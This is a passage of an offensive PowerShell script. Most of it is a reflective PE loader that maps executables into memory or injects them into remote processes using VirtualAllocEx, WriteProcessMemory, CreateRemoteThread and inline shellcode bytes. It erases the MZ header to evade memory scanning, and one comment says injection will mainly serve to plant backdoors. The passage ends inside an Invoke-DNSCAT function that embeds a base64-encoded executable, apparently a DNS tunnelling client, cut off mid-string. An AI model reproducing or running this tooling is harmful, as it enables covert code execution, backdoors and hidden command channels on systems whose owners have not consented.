		#Verify that the PE and the current process are the same bits (32bit or 64bit)
		$Process64Bit = $true
		if ($RemoteLoading -eq $true)
		{
			$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
			$Result = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "IsWow64Process")
			if ($Result -eq [IntPtr]::Zero)
			{
				Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
			}

			[Bool]$Wow64Process = $false
			$Success = $Win32Functions.IsWow64Process.Invoke($RemoteProcHandle, [Ref]$Wow64Process)
			if ($Success -eq $false)
			{
				Throw "Call to IsWow64Process failed"
			}

			if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
			{
				$Process64Bit = $false
			}

			#PowerShell needs to be same bit as the PE being loaded for IntPtr to work correctly
			$PowerShell64Bit = $true
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$PowerShell64Bit = $false
			}
			if ($PowerShell64Bit -ne $Process64Bit)
			{
				throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
			}
		}
		else
		{
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$Process64Bit = $false
			}
		}
		if ($Process64Bit -ne $PEInfo.PE64Bit)
		{
			Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
		}


		#Allocate memory and write the PE to memory. If the PE supports ASLR, allocate to a random memory address
		Write-Verbose "Allocating memory for the PE and write its headers to memory"

        #ASLR check
		[IntPtr]$LoadAddr = [IntPtr]::Zero
        $PESupportsASLR = ([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -eq $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
		if ((-not $ForceASLR) -and (-not $PESupportsASLR))
		{
			Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again OR try using the -ForceASLR flag (could cause crashes)" -WarningAction Continue
			[IntPtr]$LoadAddr = $OriginalImageBase
		}
        elseif ($ForceASLR -and (-not $PESupportsASLR))
        {
            Write-Verbose "PE file doesn't support ASLR but -ForceASLR is set. Forcing ASLR on the PE file. This could result in a crash."
        }

        if ($ForceASLR -and $RemoteLoading)
        {
            Write-Error "Cannot use ForceASLR when loading in to a remote process." -ErrorAction Stop
        }
        if ($RemoteLoading -and (-not $PESupportsASLR))
        {
            Write-Error "PE doesn't support ASLR. Cannot load a non-ASLR PE in to a remote process" -ErrorAction Stop
        }

		$PEHandle = [IntPtr]::Zero				#This is where the PE is allocated in PowerShell
		$EffectivePEHandle = [IntPtr]::Zero		#This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $PEHandle. If it is loaded in a remote process, this is the address in the remote process.
		if ($RemoteLoading -eq $true)
		{
			#Allocate space in the remote process, and also allocate space in PowerShell. The PE will be setup in PowerShell and copied to the remote process when it is setup
			$PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)

			#todo, error handling needs to delete this memory if an error happens along the way
			$EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($EffectivePEHandle -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
			}
		}
		else
		{
			if ($NXCompatible -eq $true)
			{
				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			}
			else
			{
				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			}
			$EffectivePEHandle = $PEHandle
		}

		[IntPtr]$PEEndAddress = Add-SignedIntAsUnsigned ($PEHandle) ([Int64]$PEInfo.SizeOfImage)
		if ($PEHandle -eq [IntPtr]::Zero)
		{
			Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
		}
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null


		#Now that the PE is in memory, get more detailed information about it
		Write-Verbose "Getting detailed PE information from the headers loaded in memory"
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		$PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
		$PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle
		Write-Verbose "StartAddress: $(Get-Hex $PEHandle)    EndAddress: $(Get-Hex $PEEndAddress)"


		#Copy each section from the PE in to memory
		Write-Verbose "Copy PE sections in to memory"
		Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types


		#Update the memory addresses hardcoded in to the PE based on the memory address the PE was expecting to be loaded to vs where it was actually loaded
		Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
		Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types


		#The PE we are in-memory loading has DLLs it needs, import those DLLs for it
		Write-Verbose "Import DLL's needed by the PE we are loading"
		if ($RemoteLoading -eq $true)
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
		}
		else
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
		}


		#Update the memory protection flags for all the memory just allocated
		if ($RemoteLoading -eq $false)
		{
			if ($NXCompatible -eq $true)
			{
				Write-Verbose "Update memory protection flags"
				Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
			}
			else
			{
				Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
			}
		}
		else
		{
			Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
		}


		#If remote loading, copy the DLL in to remote process memory
		if ($RemoteLoading -eq $true)
		{
			[UInt32]$NumBytesWritten = 0
			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
			if ($Success -eq $false)
			{
				Throw "Unable to write shellcode to remote process memory."
			}
		}


		#Call the entry point, if this is a DLL the entrypoint is the DllMain function, if it is an EXE it is the Main function
		if ($PEInfo.FileType -ieq "DLL")
		{
			if ($RemoteLoading -eq $false)
			{
				Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
				$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)

				$DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
			}
			else
			{
				$DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)

				if ($PEInfo.PE64Bit -eq $true)
				{
					#Shellcode: CallDllMain.asm
					$CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				}
				else
				{
					#Shellcode: CallDllMain.asm
					$CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				}
				$SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
				$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
				$SCPSMemOriginal = $SCPSMem

				Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)

				$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
				if ($RSCAddr -eq [IntPtr]::Zero)
				{
					Throw "Unable to allocate memory in the remote process for shellcode"
				}

				$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
				if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
				{
					Throw "Unable to write shellcode to remote process memory."
				}

				$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
				$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
				if ($Result -ne 0)
				{
					Throw "Call to CreateRemoteThread to call GetProcAddress failed."
				}

				$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			}
		}
		elseif ($PEInfo.FileType -ieq "EXE")
		{
			#Overwrite GetCommandLine and ExitProcess so we can provide our own arguments to the EXE and prevent it from killing the PS process
			[IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
			[System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
			$OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr

			#If this is an EXE, call the entry point in a new thread. We have overwritten the ExitProcess function to instead ExitThread
			#	This way the reflectively loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.
			[IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			Write-Verbose "Call EXE Main function. Address: $(Get-Hex $ExeMainPtr). Creating thread for the EXE to run in."

			$Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

			while($true)
			{
				[Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
				if ($ThreadDone -eq 1)
				{
					Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants
					Write-Verbose "EXE thread has completed."
					break
				}
				else
				{
					Start-Sleep -Seconds 1
				}
			}
		}

		return @($PEInfo.PEHandle, $EffectivePEHandle)
	}


	Function Invoke-MemoryFreeLibrary
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$PEHandle
		)

		#Get Win32 constants and functions
		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types

		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants

		#Call FreeLibrary for all the imports of the DLL
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)

			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)

				#If the structure is null, it signals that this is the end of the array
				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done unloading the libraries needed by the PE"
					break
				}

				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
				$ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)

				if ($ImportDllHandle -eq $null)
				{
					Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways" -WarningAction Continue
				}

				$Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
				if ($Success -eq $false)
				{
					Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
				}

				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}

		#Call DllMain with process detach
		Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
		$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)

		$DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null


		$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
		if ($Success -eq $false)
		{
			Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
		}
	}


	Function Main
	{
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		$Win32Constants =  Get-Win32Constants

		$RemoteProcHandle = [IntPtr]::Zero

		#If a remote process to inject in to is specified, get a handle to it
		if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
		{
			Throw "Can't supply a ProcId and ProcName, choose one or the other"
		}
		elseif ($ProcName -ne $null -and $ProcName -ne "")
		{
			$Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
			if ($Processes.Count -eq 0)
			{
				Throw "Can't find process $ProcName"
			}
			elseif ($Processes.Count -gt 1)
			{
				$ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
				Write-Output $ProcInfo
				Throw "More than one instance of $ProcName found, please specify the process ID to inject in to."
			}
			else
			{
				$ProcId = $Processes[0].ID
			}
		}

		#Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.
		#If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege
#		if ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)
#		{
#			Write-Verbose "Getting SeDebugPrivilege"
#			Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
#		}

		if (($ProcId -ne $null) -and ($ProcId -ne 0))
		{
			$RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
			if ($RemoteProcHandle -eq [IntPtr]::Zero)
			{
				Throw "Couldn't obtain the handle for process ID: $ProcId"
			}

			Write-Verbose "Got the handle for the remote process to inject in to"
		}


		#Load the PE reflectively
		Write-Verbose "Calling Invoke-MemoryLoadLibrary"
		$PEHandle = [IntPtr]::Zero
		if ($RemoteProcHandle -eq [IntPtr]::Zero)
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -ForceASLR $ForceASLR
		}
		else
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle -ForceASLR $ForceASLR
		}
		if ($PELoadedInfo -eq [IntPtr]::Zero)
		{
			Throw "Unable to load PE, handle returned is NULL"
		}

		$PEHandle = $PELoadedInfo[0]
		$RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process


		#Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
		{
			#########################################
			### YOUR CODE GOES HERE
			#########################################
	        switch ($FuncReturnType)
	        {
	            'WString' {
	                Write-Verbose "Calling function with WString return type"
				    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "WStringFunc"
				    if ($WStringFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $WStringFuncDelegate = Get-DelegateType @() ([IntPtr])
				    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
				    [IntPtr]$OutputPtr = $WStringFunc.Invoke()
				    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
				    Write-Output $Output
	            }

	            'String' {
	                Write-Verbose "Calling function with String return type"
				    [IntPtr]$StringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "StringFunc"
				    if ($StringFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $StringFuncDelegate = Get-DelegateType @() ([IntPtr])
				    $StringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StringFuncAddr, $StringFuncDelegate)
				    [IntPtr]$OutputPtr = $StringFunc.Invoke()
				    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($OutputPtr)
				    Write-Output $Output
	            }

	            'Void' {
	                Write-Verbose "Calling function with Void return type"
				    [IntPtr]$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
				    if ($VoidFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $VoidFuncDelegate = Get-DelegateType @() ([Void])
				    $VoidFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VoidFuncAddr, $VoidFuncDelegate)
				    $VoidFunc.Invoke() | Out-Null
	            }
	        }
			#########################################
			### END OF YOUR CODE
			#########################################
		}
		#For remote DLL injection, call a void function which takes no parameters
		elseif (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
			if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
			{
				Throw "VoidFunc couldn't be found in the DLL"
			}

			$VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
			$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle

			#Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
			$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
		}

		#Don't free a library if it is injected in a remote process or if it is an EXE.
        #Note that all DLL's loaded by the EXE will remain loaded in memory.
		if ($RemoteProcHandle -eq [IntPtr]::Zero -and $PEInfo.FileType -ieq "DLL")
		{
			Invoke-MemoryFreeLibrary -PEHandle $PEHandle
		}
		else
		{
			#Delete the PE file from memory.
			$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
			if ($Success -eq $false)
			{
				Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
			}
		}

		Write-Verbose "Done!"
	}

	Main
}

#Main function to either run the script locally or remotely
Function Main
{
	if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
	{
		$DebugPreference  = "Continue"
	}

	Write-Verbose "PowerShell ProcessID: $PID"

	#Verify the image is a valid PE file
	$e_magic = ($PEBytes[0..1] | % {[Char] $_}) -join ''

    if ($e_magic -ne 'MZ')
    {
        throw 'PE is not a valid PE file.'
    }

	if (-not $DoNotZeroMZ) {
		# Remove 'MZ' from the PE file so that it cannot be detected by .imgscan in WinDbg
		# TODO: Investigate how much of the header can be destroyed, I'd imagine most of it can be.
		$PEBytes[0] = 0
		$PEBytes[1] = 0
	}

	#Add a "program name" to exeargs, just so the string looks as normal as possible (real args start indexing at 1)
	if ($ExeArgs -ne $null -and $ExeArgs -ne '')
	{
		$ExeArgs = "ReflectiveExe $ExeArgs"
	}
	else
	{
		$ExeArgs = "ReflectiveExe"
	}

	if ($ComputerName -eq $null -or $ComputerName -imatch "^\s*$")
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR)
	}
	else
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR) -ComputerName $ComputerName
	}
}

Main
}

function Invoke-DNSCAT
{

Param(
  [string]$domain,
	[string]$server,
  [string]$secret,
  [string]$port,
  [string]$type


)
$B64exe = "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